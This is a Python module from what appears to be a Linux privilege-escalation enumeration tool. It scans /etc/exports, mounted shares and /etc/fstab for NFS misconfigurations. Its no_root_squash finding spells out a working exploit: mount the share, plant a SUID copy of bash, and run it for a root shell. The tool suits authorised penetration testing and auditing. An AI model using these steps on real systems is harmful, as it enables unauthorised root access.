"""
NFS Enumerator
==============

Enumerate NFS shares for privilege escalation.

NFS shares with no_root_squash allow root on the client to be root
on the share - enabling SUID binary creation for privilege escalation.
"""

import os
from typing import List, Dict, Optional

from ..core.base import BaseEnumerator
from ..core.findings import FindingSeverity


class NFSEnumerator(BaseEnumerator):
    """
    Enumerate NFS-related privilege escalation vectors.

    Checks:
    - /etc/exports for no_root_squash
    - Mounted NFS shares
    - NFS share permissions
    """

    name = "NFS Enumerator"
    description = "Find NFS-based privilege escalation vectors"

    def enumerate(self) -> None:
        """Run NFS enumeration"""
        self.print_header()

        self._check_exports()
        self._check_mounted_nfs()

    def _check_exports(self) -> None:
        """Check /etc/exports for misconfigurations"""
        self.log("Checking /etc/exports...")

        exports_path = '/etc/exports'

        if not os.path.exists(exports_path):
            self.log("/etc/exports not found", "info")
            return

        try:
            with open(exports_path, 'r') as f:
                content = f.read()

            if not content.strip():
                self.log("/etc/exports is empty")
                return

            self.log("/etc/exports contents:")
            print(content)

            # Parse each export line
            for line in content.split('\n'):
                line = line.strip()

                if not line or line.startswith('#'):
                    continue

                self._analyze_export_line(line)

        except PermissionError:
            self.log("/etc/exports not readable", "warning")

    def _analyze_export_line(self, line: str) -> None:
        """Analyze an NFS export line for vulnerabilities"""
        # Check for no_root_squash (critical)
        if 'no_root_squash' in line:
            # Extract share path
            share_path = line.split()[0] if line.split() else line

            self.log(f"no_root_squash found: {line}", "critical")

            self.add_finding(
                category="NFS no_root_squash",
                severity=FindingSeverity.CRITICAL,
                finding=f"NFS share with no_root_squash: {share_path}",
                exploitation=(
                    "Exploit no_root_squash:\n"
                    "  # On attacker machine (as root):\n"
                    f"  mount -t nfs TARGET:{share_path} /mnt/nfs\n"
                    "  \n"
                    "  # Create SUID binary:\n"
                    "  cp /bin/bash /mnt/nfs/rootbash\n"
                    "  chmod +s /mnt/nfs/rootbash\n"
                    "  \n"
                    "  # On target machine:\n"
                    f"  {share_path}/rootbash -p  # Root shell!"
                ),
                impact="Critical - Root via SUID binary on NFS",
                target=share_path,
                export_line=line
            )

        # Check for no_all_squash (less critical but notable)
        elif 'no_all_squash' in line:
            share_path = line.split()[0] if line.split() else line

            self.log(f"no_all_squash found: {line}", "warning")

            self.add_finding(
                category="NFS no_all_squash",
                severity=FindingSeverity.MEDIUM,
                finding=f"NFS share with no_all_squash: {share_path}",
                exploitation="UID/GID preserved - may allow file manipulation",
                impact="Medium - Potential file permission issues",
                target=share_path
            )

        # Check for world-accessible shares
        if '*' in line or '0.0.0.0' in line:
            share_path = line.split()[0] if line.split() else line

            self.add_finding(
                category="NFS World Accessible",
                severity=FindingSeverity.MEDIUM,
                finding=f"NFS share accessible to all: {share_path}",
                exploitation="Mount from any host on the network",
                impact="Medium - Information exposure",
                target=share_path
            )

    def _check_mounted_nfs(self) -> None:
        """Check for currently mounted NFS shares"""
        self.log("Checking mounted NFS shares...")

        output = self.run_command("mount | grep nfs")

        if output:
            self.log("Mounted NFS shares:", "success")
            print(output)

            # Check each mounted share
            for line in output.split('\n'):
                if line.strip():
                    self._analyze_mounted_share(line)
        else:
            self.log("No NFS shares currently mounted")

        # Also check /etc/fstab for NFS entries
        self._check_fstab_nfs()

    def _analyze_mounted_share(self, mount_line: str) -> None:
        """Analyze a mounted NFS share"""
        parts = mount_line.split()

        if len(parts) >= 3:
            source = parts[0]
            mount_point = parts[2]

            # Check if mount point is writable
            if os.access(mount_point, os.W_OK):
                self.log(f"Writable NFS mount: {mount_point}", "warning")

                self.add_finding(
                    category="Writable NFS Mount",
                    severity=FindingSeverity.MEDIUM,
                    finding=f"NFS mount is writable: {mount_point}",
                    exploitation="Write files to NFS share - check for no_root_squash on server",
                    impact="Medium - Depends on server configuration",
                    target=mount_point,
                    source=source
                )

    def _check_fstab_nfs(self) -> None:
        """Check /etc/fstab for NFS entries"""
        try:
            with open('/etc/fstab', 'r') as f:
                content = f.read()

            for line in content.split('\n'):
                if 'nfs' in line and not line.strip().startswith('#'):
                    self.log(f"NFS entry in fstab: {line.strip()}", "info")
        except:
            pass